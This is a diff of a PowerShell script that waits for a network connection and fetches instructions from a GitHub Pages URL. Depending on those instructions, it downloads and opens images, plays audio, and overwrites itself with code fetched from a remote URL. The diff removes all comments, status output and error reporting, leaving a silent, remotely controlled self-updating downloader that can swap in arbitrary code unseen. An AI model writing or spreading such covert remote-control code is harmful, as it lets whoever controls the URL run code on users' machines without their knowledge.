@@ -1,64 +1,38 @@
-# =========================
-# advance.ps1 (with haveMessage, havePhoto, haveMusic, and self-updater)
-# =========================
-
-# =========================
-# advance.ps1 (with Internet Wait)
-# =========================
-
 $ErrorActionPreference = "Stop"
 
-# Wait silently for internet connection before continuing
 function Wait-ForInternet {
-    $pingTarget = "8.8.8.8"  # Google DNS (reliable)
+    $pingTarget = "8.8.8.8"
     while ($true) {
         try {
-            $ping = Test-Connection -ComputerName $pingTarget -Count 1 -Quiet -ErrorAction Stop
-            if ($ping) { return }
+            if (Test-Connection -ComputerName $pingTarget -Count 1 -Quiet -ErrorAction Stop) {
+                return
+            }
         }
-        catch {
-            # Ignore error, keep trying
-        }
+        catch { }
         Start-Sleep -Seconds 5
     }
 }
 
 Wait-ForInternet
-# =========================
-
-$ErrorActionPreference = "Stop"
 
 $scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
 $scriptPath = $MyInvocation.MyCommand.Path
 $url = "https://yastiwariservies.github.io/fantasy/chintu/DOTHIS.txt"
 
-# Track music playback
 $musicPlayed = $false
 $updateScheduled = $false
 $updateUrl = ""
 
-# 1. Send request and print full response
 try {
     $response = Invoke-WebRequest -Uri $url -UseBasicParsing -ErrorAction Stop
     $content = $response.Content
-    Write-Host "=== Full Response (UPDATED) ==="
-    Write-Host $content
 }
 catch {
-    Write-Host "[ERROR] Failed to fetch $url"
     exit
 }
 
-# 2. Break response into lines and print numbered list
 $lines = $content -split "`n"
-Write-Host "`n=== Response Lines ==="
-for ($i = 0; $i -lt $lines.Count; $i++) {
-    $lineNumber = $i + 1
-    Write-Host "$lineNumber. $($lines[$i])"
-}
 
-# 3. Parse each line and check for TRUE flags
-Write-Host "`n=== Parsed Lines and Actions ==="
 foreach ($line in $lines) {
     if ($line.Trim() -eq "") { continue }
 
@@ -67,29 +41,18 @@ foreach ($line in $lines) {
         $flag    = $matches['flag']
         $fileUrl = $matches['url']
 
-        Write-Host "Key: $key | Flag: $flag | URL: $fileUrl"
-
-        # ---- haveMessage ----
         if ($key -eq "haveMessage" -and $flag -eq "TRUE") {
-            Write-Host "`n[INFO] Fetching message from $fileUrl ..."
             try {
                 $msgResponse = Invoke-WebRequest -Uri $fileUrl -UseBasicParsing -ErrorAction Stop
-                Write-Host "`n=== Message Content ==="
                 Write-Host $msgResponse.Content
             }
-            catch {
-                Write-Host "[ERROR] Failed to fetch message: $($_.Exception.Message)"
-            }
+            catch { }
         }
 
-        # ---- havePhoto ----
         if ($key -eq "havePhoto" -and $flag -eq "TRUE") {
-            Write-Host "`n[INFO] Downloading photo from $fileUrl ..."
-
             try {
                 $mediaDir = Join-Path $scriptDir "media"
                 if (-not (Test-Path $mediaDir)) {
-                    Write-Host "[INFO] Creating media folder..."
                     New-Item -Path $mediaDir -ItemType Directory | Out-Null
                 }
 
@@ -99,28 +62,16 @@ foreach ($line in $lines) {
                 $photoFile = Join-Path $mediaDir ("image" + $ext)
 
                 Invoke-WebRequest -Uri $fileUrl -OutFile $photoFile -ErrorAction Stop
-                Write-Host "[INFO] Photo saved to $photoFile"
 
-                if ($musicPlayed) {
-                    Write-Host "[INFO] Opening photo after music finished..."
-                    Start-Process $photoFile
-                } else {
-                    Start-Process $photoFile
-                }
+                Start-Process $photoFile
             }
-            catch {
-                Write-Host "[ERROR] Failed to download/open photo: $($_.Exception.Message)"
-            }
+            catch { }
         }
 
-        # ---- haveMusic ----
         if ($key -eq "haveMusic" -and $flag -eq "TRUE") {
-            Write-Host "`n[INFO] Downloading music from $fileUrl ..."
-
             try {
                 $mediaDir = Join-Path $scriptDir "media"
                 if (-not (Test-Path $mediaDir)) {
-                    Write-Host "[INFO] Creating media folder..."
                     New-Item -Path $mediaDir -ItemType Directory | Out-Null
                 }
 
@@ -130,8 +81,6 @@ foreach ($line in $lines) {
                 $musicFile = Join-Path $mediaDir ("music" + $ext)
 
                 Invoke-WebRequest -Uri $fileUrl -OutFile $musicFile -ErrorAction Stop
-                Write-Host "[INFO] Music saved to $musicFile"
-                Write-Host "[INFO] Playing music silently (blocking until complete)..."
 
                 Add-Type -AssemblyName System.Windows.Forms
                 $player = New-Object System.Media.SoundPlayer
@@ -139,47 +88,24 @@ foreach ($line in $lines) {
                 $player.Load()
                 $player.PlaySync()
 
-                Write-Host "[INFO] Music finished playing."
                 $musicPlayed = $true
             }
-            catch {
-                Write-Host "[ERROR] Failed to download/play music: $($_.Exception.Message)"
-            }
+            catch { }
         }
 
-        # ---- hasUpdate ----
         if ($key -eq "hasUpdate" -and $flag -eq "TRUE") {
-            Write-Host "`n[INFO] Update available! Scheduling update from $fileUrl ..."
             $updateScheduled = $true
             $updateUrl = $fileUrl
         }
-
-    } else {
-        Write-Host "[WARN] Could not parse line: $line"
     }
 }
 
-# 4. If update is scheduled, fetch update.txt and overwrite advance.ps1
 if ($updateScheduled -and $updateUrl) {
     try {
-        Write-Host "`n[INFO] Fetching update from $updateUrl ..."
         $newCode = Invoke-WebRequest -Uri $updateUrl -UseBasicParsing -ErrorAction Stop
-
-        # Backup current script (optional)
         $backupPath = $scriptPath + ".bak"
         Copy-Item -Path $scriptPath -Destination $backupPath -Force
-        Write-Host "[INFO] Backup of current script saved to $backupPath"
-
-        # Overwrite script
         Set-Content -Path $scriptPath -Value $newCode.Content -Force -Encoding UTF8
-        Write-Host "[SUCCESS] Script has been updated successfully!"
-
-        # Optionally prompt user to re-run
-        Write-Host "`n[INFO] Please re-run the script to load the new version."
-
     }
-    catch {
-        Write-Host "[ERROR] Failed to fetch or apply update: $($_.Exception.Message)"
-    }
+    catch { }
 }
-
